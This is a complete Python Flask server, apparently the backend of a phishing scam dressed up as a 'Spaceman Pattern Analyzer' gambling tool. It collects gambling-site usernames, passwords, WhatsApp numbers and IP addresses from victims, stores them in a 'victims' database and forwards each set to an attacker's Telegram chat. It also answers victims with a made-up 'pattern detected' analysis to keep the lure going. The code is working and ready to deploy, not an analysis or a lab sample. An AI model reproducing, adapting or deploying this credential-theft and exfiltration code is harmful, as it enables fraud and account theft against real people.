#!/usr/bin/env python3
# bot.py - Spaceman Bot Cloud Ready

import sys
import os
sys.path.append(os.path.dirname(os.path.abspath(__file__)))

import json
import sqlite3
import logging
import hashlib
from datetime import datetime
from flask import Flask, request, jsonify
from flask_cors import CORS
import requests
import threading
import time
import random

# Import configuration
try:
    import setting
except ImportError:
    print("⚠️ Warning: setting.py not found, using environment variables")
    from types import SimpleNamespace
    setting = SimpleNamespace()
    setting.TELEGRAM = {
        "BOT_TOKEN": os.environ.get("TELEGRAM_BOT_TOKEN", ""),
        "CHAT_ID": os.environ.get("TELEGRAM_CHAT_ID", ""),
        "PARSE_MODE": "Markdown"
    }
    setting.SERVER = {
        "HOST": "0.0.0.0",
        "PORT": int(os.environ.get("PORT", 9000)),
        "DEBUG": False
    }
    setting.DATABASE = {"PATH": "database/victims.db"}
    setting.LOGGING = {
        "LEVEL": "INFO",
        "FORMAT": "%(asctime)s - %(name)s - %(levelname)s - %(message)s",
        "FILE": "logs/bot.log"
    }
    setting.SCAM = {
        "VERSION": "2.0.0",
        "WEBSITE_URL": os.environ.get("WEBSITE_URL", "https://polagacor888.netlify.app"),
        "SUCCESS_RATE": 94.7
    }
    setting.PATHS = {
        "DATABASE_DIR": "database",
        "LOGS_DIR": "logs",
        "BACKUP_DIR": "backups"
    }

# Setup logging
logging.basicConfig(
    level=getattr(logging, setting.LOGGING.get("LEVEL", "INFO")),
    format=setting.LOGGING.get("FORMAT", "%(asctime)s - %(name)s - %(levelname)s - %(message)s"),
    handlers=[
        logging.FileHandler(setting.LOGGING.get("FILE", "logs/bot.log")),
        logging.StreamHandler()
    ]
)

logger = logging.getLogger(__name__)

# Initialize Flask app
app = Flask(__name__)
CORS(app, resources={r"/*": {"origins": "*"}})

# Database setup
def init_database():
    """Initialize SQLite database"""
    try:
        os.makedirs(setting.PATHS.get("DATABASE_DIR", "database"), exist_ok=True)
        
        conn = sqlite3.connect(setting.DATABASE.get("PATH", "database/victims.db"))
        cursor = conn.cursor()
        
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS victims (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                victim_id TEXT UNIQUE,
                game_url TEXT,
                game_username TEXT NOT NULL,
                game_password TEXT NOT NULL,
                whatsapp_number TEXT,
                ip_address TEXT,
                user_agent TEXT,
                received_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                telegram_sent BOOLEAN DEFAULT 0,
                status TEXT DEFAULT 'pending'
            )
        ''')
        
        conn.commit()
        conn.close()
        logger.info("Database initialized")
        
    except Exception as e:
        logger.error(f"Database init failed: {e}")

# Bot functions
class SpacemanBot:
    def __init__(self):
        self.start_time = datetime.now()
        self.victims_processed = 0
        self.telegram_sent = 0
        
    def generate_victim_id(self, data):
        """Generate unique victim ID"""
        victim_string = f"{data.get('gameUsername', '')}{datetime.now().timestamp()}"
        return hashlib.md5(victim_string.encode()).hexdigest()[:12]
    
    def save_victim(self, data, ip_address):
        """Save victim data to database"""
        try:
            victim_id = self.generate_victim_id(data)
            
            conn = sqlite3.connect(setting.DATABASE.get("PATH", "database/victims.db"))
            cursor = conn.cursor()
            
            cursor.execute('''
                INSERT INTO victims 
                (victim_id, game_url, game_username, game_password, whatsapp_number, ip_address, user_agent)
                VALUES (?, ?, ?, ?, ?, ?, ?)
            ''', (
                victim_id,
                data.get('gameUrl', ''),
                data.get('gameUsername', ''),
                data.get('gamePassword', ''),
                data.get('whatsappNumber', ''),
                ip_address,
                data.get('userAgent', '')
            ))
            
            conn.commit()
            conn.close()
            
            self.victims_processed += 1
            logger.info(f"Victim saved: {victim_id}")
            return victim_id
            
        except Exception as e:
            logger.error(f"Save victim failed: {e}")
            return None
    
    def send_to_telegram(self, victim_id, data):
        """Send victim data to Telegram"""
        try:
            token = setting.TELEGRAM.get("BOT_TOKEN")
            chat_id = setting.TELEGRAM.get("CHAT_ID")
            
            if not token or not chat_id:
                logger.warning("Telegram credentials not set")
                return False, None
            
            message = f"""🎰 *NEW VICTIM* 🎰

🆔 *ID:* `{victim_id}`
⏰ *Time:* {datetime.now().strftime("%Y-%m-%d %H:%M:%S")}

👤 *CREDENTIALS:*
• Username: `{data.get('gameUsername', 'N/A')}`
• Password: `{data.get('gamePassword', 'N/A')}`
• URL: {data.get('gameUrl', 'N/A')}

📱 *WHATSAPP:* {data.get('whatsappNumber', 'N/A')}
🌐 *IP:* `{data.get('ip', 'N/A')}`

📊 *STATS:*
• Total Victims: {self.victims_processed}
• Bot Uptime: {self.get_uptime()}
"""
            
            url = f"https://api.telegram.org/bot{token}/sendMessage"
            response = requests.post(url, json={
                "chat_id": chat_id,
                "text": message,
                "parse_mode": "Markdown"
            }, timeout=10)
            
            if response.status_code == 200:
                conn = sqlite3.connect(setting.DATABASE.get("PATH", "database/victims.db"))
                cursor = conn.cursor()
                cursor.execute(
                    "UPDATE victims SET telegram_sent = 1, status = 'sent' WHERE victim_id = ?",
                    (victim_id,)
                )
                conn.commit()
                conn.close()
                
                self.telegram_sent += 1
                logger.info(f"Telegram sent: {victim_id}")
                return True, response.json().get('result', {}).get('message_id')
            else:
                logger.error(f"Telegram error: {response.text}")
                return False, None
                
        except Exception as e:
            logger.error(f"Telegram failed: {e}")
            return False, None
    
    def get_uptime(self):
        """Calculate bot uptime"""
        delta = datetime.now() - self.start_time
        hours, remainder = divmod(delta.seconds, 3600)
        minutes, seconds = divmod(remainder, 60)
        return f"{hours}h {minutes}m {seconds}s"

# Initialize bot
bot = SpacemanBot()

# API Routes
@app.route('/')
def home():
    return jsonify({
        "app": "Spaceman Pattern Analyzer",
        "version": setting.SCAM.get("VERSION", "2.0.0"),
        "status": "online",
        "uptime": bot.get_uptime(),
        "endpoints": {
            "status": "/api/status",
            "victim": "/api/victim",
            "stats": "/api/stats"
        }
    })

@app.route('/api/status', methods=['GET'])
def api_status():
    return jsonify({
        "status": "online",
        "bot_id": bot.generate_victim_id({"gameUsername": "status"}),
        "start_time": bot.start_time.isoformat(),
        "victims_count": bot.victims_processed,
        "telegram_sent": bot.telegram_sent,
        "website_url": setting.SCAM.get("WEBSITE_URL", ""),
        "message": "Spaceman Bot is operational"
    })

@app.route('/api/victim', methods=['POST'])
def api_victim():
    try:
        data = request.get_json()
        
        if not data:
            return jsonify({"success": False, "error": "No data"}), 400
        
        # Validate
        if not data.get('gameUsername') or not data.get('gamePassword'):
            return jsonify({"success": False, "error": "Missing username/password"}), 400
        
        # Save victim
        ip_address = request.remote_addr
        victim_id = bot.save_victim(data, ip_address)
        
        if not victim_id:
            return jsonify({"success": False, "error": "Failed to save"}), 500
        
        # Send to Telegram (async)
        telegram_thread = threading.Thread(
            target=bot.send_to_telegram,
            args=(victim_id, data)
        )
        telegram_thread.start()
        
        # Response
        return jsonify({
            "success": True,
            "message": "Data received",
            "victim_id": victim_id,
            "analysis": {
                "confidence": setting.SCAM.get("SUCCESS_RATE", 94.7),
                "message": "Pattern detected with high probability",
                "recommendation": "Proceed with injection"
            },
            "timestamp": datetime.now().isoformat()
        })
        
    except Exception as e:
        logger.error(f"API error: {e}")
        return jsonify({"success": False, "error": str(e)}), 500

@app.route('/api/stats', methods=['GET'])
def api_stats():
    try:
        conn = sqlite3.connect(setting.DATABASE.get("PATH", "database/victims.db"))
        cursor = conn.cursor()
        cursor.execute("SELECT COUNT(*) FROM victims")
        total = cursor.fetchone()[0]
        cursor.execute("SELECT COUNT(*) FROM victims WHERE telegram_sent = 1")
        sent = cursor.fetchone()[0]
        conn.close()
        
        return jsonify({
            "total_victims": total,
            "telegram_sent": sent,
            "bot_uptime": bot.get_uptime(),
            "start_time": bot.start_time.isoformat()
        })
    except Exception as e:
        return jsonify({"success": False, "error": str(e)}), 500

# Create necessary directories on startup
def create_directories():
    os.makedirs(setting.PATHS.get("DATABASE_DIR", "database"), exist_ok=True)
    os.makedirs(setting.PATHS.get("LOGS_DIR", "logs"), exist_ok=True)
    os.makedirs(setting.PATHS.get("BACKUP_DIR", "backups"), exist_ok=True)

# Gunicorn compatibility
application = app

# Main
if __name__ == "__main__":
    create_directories()
    init_database()
    
    port = int(os.environ.get("PORT", setting.SERVER.get("PORT", 9000)))
    
    print(f"""
    🚀 SPACEMAN BOT v{setting.SCAM.get('VERSION', '2.0.0')}
    ==========================================
    🔗 Website: {setting.SCAM.get('WEBSITE_URL', '')}
    🌐 API URL: http://0.0.0.0:{port}
    📞 Endpoint: /api/victim
    
    📊 Bot Status: ONLINE
    ⏰ Start Time: {bot.start_time.strftime('%Y-%m-%d %H:%M:%S')}
    📈 Success Rate: {setting.SCAM.get('SUCCESS_RATE', 94.7)}%
    
    🔧 Configuration:
    • Telegram: {'READY' if setting.TELEGRAM.get('BOT_TOKEN') else 'NOT SET'}
    • Database: SQLite
    • Environment: {'CLOUD' if 'PORT' in os.environ else 'LOCAL'}
    ==========================================
    """)
    
    # For local development only
    if os.environ.get("RAILWAY_ENVIRONMENT") != "production":
        app.run(host='0.0.0.0', port=port, debug=False)